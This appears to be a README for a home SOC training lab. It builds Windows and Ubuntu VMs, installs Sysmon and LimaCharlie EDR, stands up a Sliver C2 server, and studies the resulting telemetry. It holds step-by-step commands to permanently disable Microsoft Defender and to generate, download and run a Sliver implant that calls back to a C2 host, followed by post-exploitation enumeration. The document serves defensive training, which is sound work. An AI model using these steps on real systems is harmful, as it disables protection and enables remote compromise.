# SOC-MOCK
## Objective
This project aimed to build a realistic Security Operations Center (SOC) training environment focusing on practical skills for detecting and responding to cyber threats.
- Advanced threat detection tools like Sysmon and LimaCharlie EDR were deployed for real-time analysis
- Adversary techniques were simulated, and threat responses were automated to stay ahead of potential risks
- YARA rules were integrated to enhance malware detection capabilities.
<br><br>

## Components

- **VirtualBox**: Used for creating and managing virtual machines.
- **Ubuntu Server VM**: Used to deploy the Sliver C2 framework, which acts as a simulated attacker tool.
- **Windows VM**: Used as victim endpoint device.
- **LimaCharlie EDR**: An EDR platform used to collect, analyze logs and investigate telemetry from the Windows VM.
- **Sliver C2**: A simulated attacker tool used to create a Command & Control (C2) server on the Ubuntu VM.
- **YARA Rules**: Specific sets of instructions used to identify malware based on patterns.
- **Sysmon**: Windows system service used to monitor and log system activity to the event log.
- **VirusTotal**: A service for analyzing suspicious files and URLs for malware.
- **NAT Network**: Configured in VirtualBox for network simulation.

<details>
  <summary><h2><b>Section 1: Setting up the Virtual Environment</b></h2></summary>
  This section will guide through the setup of virtual environment using VirtualBox (If you want you, can use VMware as well). Configure a NAT network and install two virtual machines – one for Ubuntu Server and another for a Windows 10. <br><br>

   **Step 1: Download and setup Virtualbox**:  
    You can download Virtualbox from here. Setup is pretty straightforward
    <br><br>
   **Step 2: Create a New VM for Windows 10**:  
   Next, set up a new virtual machine in VirtualBox for Windows 10.
  - **Create it with following minimum specs:**
   - RAM: Approx 2 GB
   - Processors: 2 CPU cores
   - Hard Disk Storage: 50 GB
    <br><br>
    
   **Step 3: Create a New VM for Ubuntu Server**:  
    Now, set up a new virtual machine in VirtualBox for Ubuntu Server.
  - **Create it with following minimum specs:**
   - RAM: Approx 2 GB
   - Processors: 2 CPU cores
   - Hard Disk Storage: 20 GB
   - During OS install, **leave defaults as is**
  ![Image](https://imgur.com/GDfOZmg.png)
    <br><br>
  - After installation it should look like this:
  ![Image](https://imgur.com/9VNGxVp.png)
    <br><br>
       
   **Step 4: Configure Windows VM**:  
    Permanently disable Microsoft Defender so it doesn’t interfere with the fun stuff we’re planning. This is pretty tricky (especially in Windows 11) as Defender will turn itself back on.
1. Disable Tamper Protection
  - Go to "Windows Security"
  - Click “Virus & threat protection”
  - Under “Virus & threat protection settings” click “Manage settings”
  - Toggle OFF the “Tamper Protection” switch. When prompted, click “Yes”
![Image](https://imgur.com/iTuPTwi.png)
  - Toggle every other option OFF as well
2. Permanently Disable Defender via Group Policy Editor
  - Click the “Start” menu icon
  - Type “cmd” into the search bar within the Start Menu
  - Right+Click “Command Prompt” and click “Run as administrator”
  - Run the following command
```
gpedit.msc
```
  - Inside the Local Group Policy Editor
  - Click Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus
  - Double-click “Turn off Microsoft Defender Antivirus”
  - Select “Enabled” (If you enable this policy setting, Defender doesn't run, and will not scan for malware or other potentially unwanted software)
  - Click "Apply"
![Image](https://imgur.com/9bsP5Lf.png)
3. Permanently Disable Defender via Registry
  - From the same administrative cmd, copy/paste this command and press Enter
<br>

```
REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

</br>

4. Prepare to boot into Safe Mode to disable all Defender services
  - Click the “Start” menu icon
  - Type “msconfig” into the search bar
  - Go to “Boot” tab and select “Boot Options”
  - Check the box for “Safe boot” and “Minimal”
![Image](https://imgur.com/0K1OBWq.png)
  - Click Apply and OK
  - System will restart into Safe Mode

5. Now, in Safe Mode, we’ll disable some services via the Registry
  - Press the “Win + R"
  - Type “regedit” into the search bar and hit Enter
  - For each of the following registry locations, browse to the key, find the “Start” value, and change it to "4"
![Image](https://imgur.com/IWskQZt.png)
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter

6. Leave Safe Mode the same way we got into it
  - Uncheck the box for “Safe boot”
  - System will restart into normal desktop environment, hopefully Defender-free
    <br><br>
</details>

<details>
  <summary><h2><b>Section 2: Install Sysmon in Windows VM</b></h2></summary>

This is actually optional in this project, but it’s a must-have analyst tool for getting very granular telemetry on your Windows endpoint. You can read more about it
[here](https://www.learn.microsoft.com/en-us/sysinternals/downloads/sysmon/). 

1. **Launch an Administrative PowerShell console for the following commands:**

- Click the “Start” menu icon
- Type “Powershell” into the search bar within the Start Menu
- Click “Windows PowerShell” and click “Run as administrator”

2. **Download Sysmon with the following command:**
```
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
```
3. **Unzip sysmon.zip**
```
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
```
4. **Download SwiftOnSecurity’s Sysmon config**
```
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
5. **Install Sysmon with Swift’s config**
```
C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
![Image](https://imgur.com/eUuEwgD.png)

6. **Check Sysmon64 service is installed and running**
```
Get-Service sysmon64
```
7. **Check for the presence of Sysmon Event Logs**
```
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
```
  <br><br>
</details>

<details>
  <summary><h2><b>Section 3: Install LimaCharlie EDR on Windows VM</b></h2></summary>

  [LimaCharlie](https://www.limacharlie.io/) 
  is a very powerful SecOps Cloud Platform. It not only comes with a cross-platform EDR agent, but also handles all of the log shipping/ingestion and has a threat detection engine. In free version you can create for up to two systems which is great for projects like this.

1. **Create a free LimaCharlie account**
- LimaCharlie will ask you a few questions about your role. Answer however you like.

2. **Create an organization**

Name: *Anything*

Data Residency Region: *Closest to you*

Demo Configuration Enabled: *Disabled*

Template: *Extended Detection & Response Standard*
![Image](.png)

3. **Click "Add a Sensor"**

- Select Windows
- Provide a description such as: Windows VM - Lab
- Click Create
- Select the Installation Key we just created
![Image](.png)
- Select the "x86-64 (.exe)" sensor
![Image](.png)

- In Windows VM, open an Administrative PowerShell and paste the following commands:
```
cd C:\Users\User\Downloads
```
```
Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
```
- Shift into a standard admin cmd

- Copy the install command provided by LimaCharlie which contains the installation key. Paste this command into your open terminal.
![Image](.png)

- Paste this command into the admin command prompt in your Windows VM

- If everything worked correctly, in the LimaCharlie web UI you should see the sensor reporting in


4. **Configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry**

- In the left-side menu, click “Artifact Collection”
- Next to “Artifact Collection Rules” click “Add Rule”
```
Name: windows-sysmon-logs
Platforms: Windows
Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*
Retention Period: 10
```
- Click “Save Rule”

LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC’s own telemetry, but Sysmon is still a very power visibility tool that runs well alongside any EDR agent.

The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we previously enabled largely depend on Sysmon logs as that is what most of them were written for.

Now would be a good time to Snapshot your Windows VM.
<br>
</details>

<details>
  <summary><h2><b>Section 4: Setup Attack System </b></h2></summary>
  I recommend using an SSH client to access the Ubuntu VM so that you can easily copy/paste commands.

1. **Open your CLI**

```
ssh username@[Linux_VM_IP]
```

2. **Now, from within this new SSH session, proceed with the following instructions to setup our attacker C2 server. First, gain access to the root shell to make life easier.**

```
sudo su
```

3. **Run the following commands to download Sliver, a Command & Control (C2) framework by BishopFox. I recommend copy/pasting the entire block as there is line-wrapping occurring.**

- Download Sliver Linux server binary
```
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
```
- Make it executable
```
chmod +x /usr/local/bin/sliver-server
```
- install mingw-w64 for additional capabilities
```
apt install -y mingw-w64
```
- Create our future working directory
```
mkdir -p /opt/sliver
```

Explore the LimaCharlie web interface to learn more about what it can do!
</details>


<details>
  <summary><h2><b>Section 5: Generate the Command & Control payload </b></h2></summary>
  Either from your SSH session or directly from your Ubuntu Server, take the following actions:
  <br></br>

  1. **Access root shell and change dir to Sliver install**

```
sudo su
cd /opt/sliver
```

  2. **Launch Sliver server**

```
sliver-server
```

  3. **Generate C2 session payload. Use your Linux VM’s IP address**
```
generate --http [Linux_VM_IP] --save /opt/sliver
```

  4. **Confirm the new implant configuration**
```
implants
```

  5. **Now we have a C2 payload we can drop onto our Windows VM. Exit Sliver for now.**
```
exit
```

  6. **To easily download the C2 payload from the Linux VM to the Windows VM, use this python trick that spins up a temp web server**
```
cd /opt/sliver
python3 -m http.server 80
```

  7. **Switch to the Windows VM and launch an Admin PowerShell console to download the implant from Ubuntu server**
```
IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
```

Now would be a good time to snapshot your Windows VM, before we execute the malware.

</details>
<details>
  <summary><h2><b>Section 6: Start Command & Control Session  </b></h2></summary>

1. **Now that the payload is on the Windows VM, switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback**

- Terminate the python web server by pressing "Ctrl + C"
- Now, relaunch Sliver
```
sliver-server
```
- Start the Sliver HTTP listener
```
http
```
- If you get an error starting the HTTP listener, reboot the VM

2. **Return to the Windows VM and execute the C2 payload from its download location using the same admin PowerShell prompt**
```
C:\Users\User\Downloads\<your_C2-implant>.exe
```

3. **Within a few moments, you should see your session check in on the Sliver server**

4. **Verify your session in Sliver, and note its Session ID**
```
sessions
```
5. **To interact with your new C2 session, type the following command into the Sliver shell**
```
use [session_id]
```
> c0ngratulations! you pwned your Windows VM
6. **Now, run a few basic commands**

- To get info about the session
```
info
```
- Find out the user and learn his privileges
```
whoami
```
```
getprivs
```
> If your implant was properly run with Admin rights, you’ll notice you have a few privileges that make further attack activity much easier, such as “SeDebugPrivilege” — if you don't see these privileges, make sure you ran the implant from an Admin command prompt
- Identify implant’s working dir
```
pwd
```
- Examine network connections occurring on the remote system
```
netstat
```
- Identify running processes on the remote system
```
ps -T
```
> Notice that Sliver highlights its own process in green and any defensive tools in red. This is how attackers become aware of what security products a victim system using.
  </details>

<details>
  <summary><h2><b>Section 7: Observe EDR Telemetry</b></h2></summary>

1. **Hop into the LimaCharlie web UI and check out some basic features**

- Click “Sensors” on left menu

- Click your active Windows sensor


- On the new left-side menu for this sensor, click “Processes”


> Explore what is returned in the process tree. Hover over some of the icons to see what they represent

Knowing common processes on a system is very important. As professionals say at SANS, *“you must know normal before you can find evil”* Check out this [“Hunt Evil”](https://www.sans.org/posters/hunt-evil/) poster from SANS.


2. **One of the easiest ways to spot unusual processes is to simply look for ones that are NOT signed**
- The C2 implant shows as not signed, and is also active on the network.


- Notice how quickly we are able to identify the destination IP this process is communicating with.

3. **Now click the “Network” tab on the left-side menu**

- Explore what is returned in the network list. "Ctrl+F" to search for your implant name

4. **Now click the “File System” tab on the left-side menu**

- Browse to the location we know our implant to be running from


5. **Inspect the hash of the suspicious executable by scanning it with VirusTotal**

> “*Item not found*” on VirusTotal doesn't mean that this file is innocent, it just might not that scanned before. This makes sense because you just generated this payload, so of course it’s not likely to be seen by VirusTotal before. So, if you already suspect a file to be possible malware, but VirusTotal has never seen it before, trust your instincts. This actually makes a file even more suspicious because nearly everything has been seen by VirusTotal, so your sample may have been custom-crafted/targeted.

6. **Click “Timeline” on the left-side menu of our sensor. This is a real-time view of EDR telemetry + event logs streaming from this system**

- Read about the various EDR events in the LimaCharlie docs.

- Filter your timeline with known IOCs (indicators of compromise) such as the name of your implant or the known C2 IP address

- If you scroll back far enough, should be able to find the moment your implant was created on the system, and when it was launched shortly after, and the network connections it created immediately after


7. **Examine the other events related to your implant process** 

- you’ll see it is responsible for other events such as “SENSITIVE_PROCESS_ACCESS” from when you enumerated your privileges in an earlier step. This particular event will be useful later on when you will craft your first detection rule

> I recommend spending more time exploring LimaCharlie telemetry to familiarize yourself not only with the known-bad events, but also the abundance of “normal” things happening on your “idle” Windows VM.
  </details>

<details>
  <summary><h2><b>Section :  </b></h2></summary>

  </details>